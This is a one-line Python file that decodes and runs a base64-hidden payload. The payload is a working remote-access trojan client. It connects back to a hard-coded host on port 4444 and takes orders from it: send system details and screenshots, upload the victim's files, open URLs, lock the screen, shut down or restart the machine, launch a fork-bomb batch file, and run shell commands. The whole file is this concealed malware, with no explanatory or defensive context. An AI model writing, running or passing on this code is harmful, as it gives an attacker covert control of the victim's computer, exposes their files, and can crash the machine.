import base64,sys;exec(base64.b64decode(b'aW1wb3J0IHN5cwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgc29ja2V0CmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgYXV0b3B5CmltcG9ydCB0aW1lCmltcG9ydCBwaWNrbGUKaW1wb3J0IGJhc2U2NAppbXBvcnQgc3RydWN0CmltcG9ydCB3ZWJicm93c2VyCmZyb20gcHN1dGlsIGltcG9ydCB2aXJ0dWFsX21lbW9yeQppbXBvcnQgdGtpbnRlciBhcyB0awoKR1JFRU4gPSAnXDMzWzMybScKUkVEID0gJ1wzM1szMW0nCllFTExPVyA9ICdcMzNbMzNtJwpDWUFOID0gJ1wwMzNbMTszNm0nCkVORCA9ICdcMzNbMG0nCkNVUkwgPSAnXDMzWzRtJwoKZGVmIHNvY2tldENyZWF0ZSgpOgogICAgZ2xvYmFsIGhvc3QKICAgIGdsb2JhbCBwb3J0CiAgICBnbG9iYWwgcwogICAgaG9zdCA9ICcxOTIuMTY4LjEuMjUnCiAgICBwb3J0ID0gNDQ0NAogICAgcyA9IHNvY2tldC5zb2NrZXQoKQoKZGVmIHNvY2tldENvbm5lY3QoKToKICAgIGdsb2JhbCBob3N0CiAgICBnbG9iYWwgcG9ydAogICAgZ2xvYmFsIHMKICAgIHMuY29ubmVjdCgoaG9zdCwgcG9ydCkpCgpkZWYgcmVjaWV2ZUNvbW1hbmRzKCk6CiAgICBnbG9iYWwgcwogICAgd2hpbGUgVHJ1ZToKICAgICAgICBkYXRhID0gcy5yZWN2KDgxOTIpCiAgICAgICAgaWYgZGF0YVs6XS5kZWNvZGUoInV0Zi04IikgPT0gJ3N5c2luZm8nOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzeXN0ZW1JbmZvID0gKCdcbicgKyBDWUFOICsgJ01hY2hpbmU6ICcgKyBFTkQgKyBHUkVFTiArIEJPTEQgKyBwbGF0Zm9ybS5tYWNoaW5lKCkgKyBFTkQgKyAnXG4nICsgQ1lBTiArICdWZXJzaW9uOiAnICsgRU5EICsgR1JFRU4gKyBCT0xEICsgcGxhdGZvcm0udmVyc2lvbigpICsgRU5EICsgJ1xuJwogICAgICAgICAgICAgICAgKyBDWUFOICsgJ1BsYXRmb3JtOiAnICsgRU5EICsgR1JFRU4gKyBCT0xEICsgcGxhdGZvcm0ucGxhdGZvcm0oKSArIEVORCArICdcbicgKyBDWUFOICsgJ1N5c3RlbTogJwogICAgICAgICAgICAgICAgKyBFTkQgKyBHUkVFTiArIEJPTEQgKyBwbGF0Zm9ybS5zeXN0ZW0oKSArIEVORCArICdcbicgKyBDWUFOICsgJ1Byb2Nlc3NvcjogJyArIEVORCArIEdSRUVOICsgQk9MRCArIHBsYXRmb3JtLnByb2Nlc3NvcigpICsgRU5EICsgJ1xuJykKICAgICAgICAgICAgICAgIHN0cihzeXN0ZW1JbmZvKQogICAgICAgICAgICAgICAgcy5zZW5kKHN0ci5lbmNvZGUoc3lzdGVtSW5mbykpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIGVycm9yID0gKFJFRCArICdbIV0gVGhlcmUgd2FzIGFuIHVua25vd24gZXJyb3IhJykKICAgICAgICAgICAgICAgIHMuc2VuZChzdHIuZW5jb2RlKGVycm9yKSkKICAgICAgICBlbGlmIGRhdGFbOjJdLmRlY29kZSgidXRmLTgiKSA9PSAnY2QnOgogICAgICAgICAgICBvcy5jaGRpcihkYXRhWzM6XS5kZWNvZGUoInV0Zi04IikpCiAgICAgICAgZWxpZiBkYXRhWzpdLmRlY29kZSgidXRmLTgiKSA9PSAnc2NyZWVuc2hvdCc6CiAgICAgICAgICAgIGdsb2JhbCBwYXRoVG9TY3JlZW5zaG90CiAgICAgICAgICAgIHBhdGggPSByJ0M6XFdpbmRvd3NcVGVtcFxMb2NhbEN1c3RvbVxzc2hcXG5ld1xjdXN0b20nCiAgICAgICAgICAgIHBhdGhUb1NjcmVlbnNob3QgPSByJ0M6XFdpbmRvd3NcVGVtcFxMb2NhbEN1c3RvbVxzc2hcXG5ld1xjdXN0b21cc2NyZWVuc2hvdC5wbmcnCiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgICAgIG9zLm1ha2VkaXJzKHBhdGgpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGJpdG1hcCA9IGF1dG9weS5iaXRtYXAuY2FwdHVyZV9zY3JlZW4oKQogICAgICAgICAgICAgICAgYml0bWFwLnNhdmUocGF0aFRvU2NyZWVuc2hvdCkKICAgICAgICAgICAgICAgIHRvb2tTY3JlZW5TaG90ID0gKCdcbicgKyBHUkVFTiArICdbKl0gU3VjY2VzZnVseSB0b29rIHNjcmVlbnNob3QgYXQgJyArIHBhdGhUb1NjcmVlbnNob3QgKyBFTkQpCiAgICAgICAgICAgICAgICB1c2UgPSAoJ1xuJyArIEdSRUVOICsgIlsqXSBVc2UgJ2Rvd25sb2FkIC1zJyB0byBkb3dubG9hZCBzY3JlZW5zaG90IiArIEVORCArICdcbicpCiAgICAgICAgICAgICAgICBzLnNlbmQoc3RyLmVuY29kZSh0b29rU2NyZWVuU2hvdCArIHVzZSkpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHNjcmVlbnNob3RGYWlsZWQgPSAoJ1xuJyArIFJFRCArICJbIV0gQ291bGRuJ3QgdGFrZSBzY3JlZW5zaG90ICIgKyBFTkQgKyAnXG4nKQogICAgICAgICAgICAgICAgc3RyKHNjcmVlbnNob3RGYWlsZWQpCiAgICAgICAgICAgICAgICBzLnNlbmQoc3RyLmVuY29kZShzY3JlZW5zaG90RmFpbGVkKSkKICAgICAgICBlbGlmIGRhdGFbOl0uZGVjb2RlKCJ1dGYtOCIpID09ICdkb3dubG9hZCAtcyc6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHdpdGggb3BlbihwYXRoVG9TY3JlZW5zaG90LCAicmIiKSBhcyBpbWFnZV9maWxlOgogICAgICAgICAgICAgICAgICAgIGVuY29kZWRfaW1hZ2UgPSBiYXNlNjQuYjY0ZW5jb2RlKGltYWdlX2ZpbGUucmVhZCgpKQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSBwaWNrbGUuZHVtcHMoZW5jb2RlZF9pbWFnZSwgMCkKICAgICAgICAgICAgICAgICAgICBzaXplID0gbGVuKGRhdGEpCiAgICAgICAgICAgICAgICAgICAgIyBzLnNlbmQoZGF0YSkKICAgICAgICAgICAgICAgICAgICBzLnNlbmQoc3RydWN0LnBhY2soIj5MIiwgc2l6ZSkgKyBkYXRhKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgZWxpZiBkYXRhWzoxMV0uZGVjb2RlKCJ1dGYtOCIpID09ICdkb3dubG9hZCAtZic6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGZpbGVkaXIgPSBkYXRhWzEyOl0uZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZmlsZWRpcik6CiAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgZmlsZSA9IG9wZW4oZmlsZWRpciwgJ3JiJykKICAgICAgICAgICAgICAgIGZpbGVfZGF0YSA9IGZpbGUucmVhZCgxMDI0KQogICAgICAgICAgICAgICAgcy5zZW5kKGZpbGVfZGF0YSkKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgIGVsaWYgZGF0YVs6N10uZGVjb2RlKCJ1dGYtOCIpID09ICdvcGVudXJsJzoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgdXJsID0gZGF0YVs4Ol0uZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgICAgICAgICB3ZWJicm93c2VyLm9wZW5fbmV3KHVybCkKICAgICAgICAgICAgICAgIHN1Y2Nlc3MgPSAnXG4nICsgR1JFRU4gKyAnWypdIE9wZW5lZCAnICsgdXJsICsgJyBzdWNjZXNzZnVsbHknICsgRU5EICsgJ1xuJwogICAgICAgICAgICAgICAgcy5zZW5kKHN0ci5lbmNvZGUoc3VjY2VzcykpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIGZhaWxlZCA9ICdcbicgKyBSRUQgKyAiWyFdIENvdWRuJ3Qgb3BlbiAiICsgdXJsICsgRU5EICsgJ1xuJwogICAgICAgICAgICAgICAgcy5zZW5kKHN0ci5lbmNvZGUoZmFpbGVkKSkKICAgICAgICBlbGlmIGRhdGFbOl0uZGVjb2RlKCJ1dGYtOCIpID09ICdzaHV0ZG93bic6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MuY2FsbChbJ3NodXRkb3duJywgIi9zIl0pCiAgICAgICAgICAgICAgICBzdWNjZXNzID0gJ1xuJyArIEdSRUVOICsgJ1sqXSBTaHV0ZG93biBzdWNjZXNzZnVsbHknICsgRU5EICsgJ1xuJwogICAgICAgICAgICAgICAgcy5zZW5kKHN0ci5lbmNvZGUoc3VjY2VzcykpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIGZhaWxlZCA9ICdcbicgKyBSRUQgKyAiWyFdIENvdWxkbid0IHNodWRvd24gY29tcHV0ZXIiICsgRU5EICsgJ1xuJwogICAgICAgICAgICAgICAgcy5zZW5kKHN0ci5lbmNvZGUoZmFpbGVkKSkKICAgICAgICBlbGlmIGRhdGFbOl0uZGVjb2RlKCJ1dGYtOCIpID09ICdyZXN0YXJ0JzoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5jYWxsKFsnc2h1dGRvd24nLCAnL3InXSkKICAgICAgICAgICAgICAgIHN1Y2Nlc3MgPSAnXG4nICsgR1JFRU4gKyAnWypdIFJlc3RhcnRlZCBzdWNjZXNzZnVsbHknICsgRU5EICsgJ1xuJwogICAgICAgICAgICAgICAgcy5zZW5kKHN0ci5lbmNvZGUoc3VjY2VzcykpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIGZhaWxlZCA9ICdcbicgKyBSRUQgKyAiWyFdIENvdWxkbid0IHJlc3RhcnQgY29tcHV0ZXIiICsgRU5EICsgJ1xuJwogICAgICAgICAgICAgICAgcy5zZW5kKHN0ci5lbmNvZGUoZmFpbGVkKSkKICAgICAgICBlbGlmIGRhdGFbOl0uZGVjb2RlKCJ1dGYtOCIpID09ICdtZW1vcnknOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBtZW0gPSBzdHIodmlydHVhbF9tZW1vcnkoKSkKICAgICAgICAgICAgICAgIHZpcnR1YWxyYW0gPSAnXG4nICsgR1JFRU4gKyAnQXZhaWxhYmxlIG1lbW9yeSBpbiBieXRlczogJyArIEVORCArIENZQU4gKyBtZW0gKyBFTkQKICAgICAgICAgICAgICAgIHMuc2VuZChzdHIuZW5jb2RlKHZpcnR1YWxyYW0pKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBlcnJvciA9IFJFRCArICJbIV0gQ291bGRuJ3QgZ2V0IHZpcnR1YWwgcmFtIiArIEVORCArICdcbicKICAgICAgICAgICAgICAgIHMuc2VuZChzdHIuZW5jb2RlKGVycm9yKSkKICAgICAgICBlbGlmIGRhdGFbOjRdLmRlY29kZSgidXRmLTgiKSA9PSAnbG9jayc6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHN1Y2Nlc3NTZW5kID0gKCdcbicgKyBHUkVFTiArICdbKl0gU3VjY2Vzc2Z1bGx5IGxvY2tlZCBjb21wdXRlciBzY3JlZW4nICsgRU5EICsgJ1xuJykKICAgICAgICAgICAgICAgIHMuc2VuZChzdHIuZW5jb2RlKHN1Y2Nlc3NTZW5kKSkKICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSBkYXRhWzU6XS5kZWNvZGUoJ3V0Zi04JykKICAgICAgICAgICAgICAgIGNsYXNzIEFwcCgpOgogICAgICAgICAgICAgICAgICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5yb290ID0gdGsuVGsoKQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnJvb3QuYXR0cmlidXRlcygnLWZ1bGxzY3JlZW4nLCBUcnVlKQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLm1haW5fZnJhbWUgPSB0ay5GcmFtZShzZWxmLnJvb3QpCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYubWFpbl9mcmFtZS5jb25maWcoYmFja2dyb3VuZD0ncmVkJywgY3Vyc29yPSdub25lJykKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5tYWluX2ZyYW1lLnBhY2soZmlsbD10ay5CT1RILCBleHBhbmQ9dGsuVFJVRSkKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5yb290LmJpbmQoJzxGMT4nLCBzZWxmLm9wZW5ub3RlKQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnJvb3QuYmluZCgnPEYyPicsIHNlbGYuY2xvc2Vub3RlKQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnJvb3QuYmluZCgnPEYzPicsIHNlbGYucXVpdCkKICAgICAgICAgICAgICAgICAgICAgICAgbCA9IHRrLkxhYmVsKHNlbGYubWFpbl9mcmFtZSwgdGV4dD1tZXNzYWdlKQogICAgICAgICAgICAgICAgICAgICAgICBsLnBhY2soKQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnJvb3QubWFpbmxvb3AoKQogICAgICAgICAgICAgICAgICAgIGRlZiBvcGVubm90ZShzZWxmLCBldmVudCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYubiA9IHRrLlRleHQoc2VsZi5tYWluX2ZyYW1lLCBiYWNrZ3JvdW5kPSdibHVlJykKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5uLnBhY2soKQogICAgICAgICAgICAgICAgICAgIGRlZiBjbG9zZW5vdGUoc2VsZiwgZXZlbnQpOgogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLm4uZGVzdHJveSgpCiAgICAgICAgICAgICAgICAgICAgZGVmIHF1aXQoc2VsZiwgZXZlbnQpOgogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnJvb3QuZGVzdHJveSgpCiAgICAgICAgICAgICAgICBBcHAoKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBlcnJvciA9ICdcbicgKyBSRUQgKyAnWyFdIFRoZXJlIHdhcyBhbiBlcnJvciBsb2NraW5nIHRoZSBzY3JlZW4nICsgRU5EICsgJ1xuJwogICAgICAgICAgICAgICAgcy5zZW5kKHN0ci5lbmNvZGUoZXJyb3IpKQoKICAgICAgICBlbGlmIGRhdGFbOl0uZGVjb2RlKCd1dGYtOCcpID09ICdjcmFzaCc6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGRlZnVsdFBhdGggPSByJ0M6XFdpbmRvd3NcVGVtcFxMb2NhbEN1c3RvbVxzc2hcXG5ld1xjdXN0b20nCiAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZGVmdWx0UGF0aCk6CiAgICAgICAgICAgICAgICAgICAgb3MubWFrZWRpcnMoZGVmdWx0UGF0aCkKICAgICAgICAgICAgICAgIHBhdGhUb0NyYXNoID0gcidDOlxXaW5kb3dzXFRlbXBcTG9jYWxDdXN0b21cc3NoXFxuZXdcY3VzdG9tXG9raWdqc2Rsa2pnLmJhdCcKICAgICAgICAgICAgICAgIHJlbW92ZVBhdGggPSByJ0M6XFdpbmRvd3NcVGVtcFxMb2NhbEN1c3RvbScKICAgICAgICAgICAgICAgIGYgPSBvcGVuKHBhdGhUb0NyYXNoLCAndycpCiAgICAgICAgICAgICAgICBmLndyaXRlKCJzdGFydCAlMFxuJTAiKQogICAgICAgICAgICAgICAgZi5jbG9zZSgpCiAgICAgICAgICAgICAgICBiYXNoY29tbWFuZCA9ICdzdGFydCAnICsgcGF0aFRvQ3Jhc2gKICAgICAgICAgICAgICAgIG9zLnN5c3RlbShiYXNoY29tbWFuZCkKICAgICAgICAgICAgICAgIG9zLnJtZGlyKHJlbW92ZVBhdGgpCiAgICAgICAgICAgICAgICBzdWNjZXNzID0gJ1xuJyArIEdSRUVOICsgJ1sqXSBTdWNjZXNzZnVsbHkgY3Jhc2hpbmcgY29tcHV0ZXInICsgRU5EICsgJ1xuJwogICAgICAgICAgICAgICAgcy5zZW5kKHN0ci5lbmNvZGUoc3VjY2VzcykpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIGVycm9yID0gJ1xuJyArIFJFRCArICdbIV0gVGhlcmUgd2FzIGFuIGVycm9yIGluIGF0dGVtcHRpbmcgdG8gY3Jhc2ggdGhlIGNvbXB1dGVyJyArIEVORCArICdcbicKICAgICAgICAgICAgICAgIHMuc2VuZChzdHIuZW5jb2RlKGVycm9yKSkKICAgICAgICBlbGlmIGRhdGFbOl0uZGVjb2RlKCd1dGYtOCcpID09ICdkaXInOgogICAgICAgICAgICBjbWQgPSBzdWJwcm9jZXNzLlBvcGVuKGRhdGFbOl0uZGVjb2RlKCd1dGYtOCcpLCBzaGVsbD1UcnVlLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5QSVBFLCBzdGRpbj1zdWJwcm9jZXNzLlBJUEUpCiAgICAgICAgICAgIG91dHB1dF9ieXRlcyA9IGNtZC5zdGRvdXQucmVhZCgpICsgY21kLnN0ZGVyci5yZWFkKCkKICAgICAgICAgICAgb3V0cHV0X3N0ciA9IHN0cihvdXRwdXRfYnl0ZXMsICJ1dGYtOCIpCiAgICAgICAgICAgIHMuc2VuZChzdHIuZW5jb2RlKG91dHB1dF9zdHIpKQogICAgaWYgcy5jbG9zZSgpOgogICAgICAgIHRpbWUuc2xlZXAoMjApCiAgICAgICAgbWFpbigpCgpkZWYgbWFpbigpOgogICAgc29ja2V0Q3JlYXRlKCkKICAgIHNvY2tldENvbm5lY3QoKQogICAgcmVjaWV2ZUNvbW1hbmRzKCkKCm1haW4oKQo='))